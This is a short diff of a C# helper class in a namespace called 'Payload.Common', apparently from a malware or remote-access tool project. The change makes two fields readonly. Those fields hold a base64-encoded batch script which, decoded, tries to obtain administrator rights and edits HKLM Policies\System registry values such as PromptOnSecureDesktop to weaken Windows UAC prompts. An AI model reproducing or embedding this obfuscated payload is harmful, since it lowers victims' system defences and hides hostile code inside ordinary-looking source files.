@@ -8,7 +8,7 @@ namespace Payload.Common
 {
     public static class TextHelper
     {
-        public static string UacBase64Debug = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
+        public static readonly string UacBase64Debug = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
 ZmYKZWNobyBHZXQgQWRtaW5pc3RyYXRvciBSaWdodHMKY2FjbHMuZXhlICIlU3lzdGVtRHJpdmUl
 XFN5c3RlbSBWb2x1bWUgSW5mb3JtYXRpb24iID5udWwgMj5udWwKaWYgJWVycm9ybGV2ZWwlPT0w
 IGdvdG8gQWRtaW4KaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAvZiAvcSAiJXRl
@@ -28,7 +28,7 @@ ZCAwIC9GCnJlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2lu
 ZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJQcm9tcHRPblNlY3VyZURl
 c2t0b3AiIC90IHJlZ19kd29yZCAvZCAwIC9GCnBhdXNl";
 
-        public static string UacBase64 = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
+        public static readonly string UacBase64 = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBv
 ZmYKZWNobyBHZXQgQWRtaW5pc3RyYXRvciBSaWdodHMKY2FjbHMuZXhlICIlU3lzdGVtRHJpdmUl
 XFN5c3RlbSBWb2x1bWUgSW5mb3JtYXRpb24iID5udWwgMj5udWwKaWYgJWVycm9ybGV2ZWwlPT0w
 IGdvdG8gQWRtaW4KaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAvZiAvcSAiJXRl
